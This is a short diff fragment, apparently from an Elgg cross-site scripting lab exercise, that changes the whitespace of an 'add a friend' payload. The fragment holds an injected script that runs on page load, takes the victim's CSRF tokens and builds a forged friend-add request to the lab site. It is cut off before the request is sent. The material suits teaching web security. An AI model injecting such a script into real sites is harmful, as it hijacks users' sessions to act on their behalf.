@@ -10,8 +10,8 @@ Example of add a friend script
 <script type="text/javascript">
   window.onload = function () {
 
-    var elgg_ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;          
-    var elgg_token = "&__elgg_token="+elgg.security.token.__elgg_token;
+    var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;          
+    var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     var url = "http://www.xsslabelgg.com/action/friends/add" + "?friend=47" + elgg_ts + elgg_token;                 
 
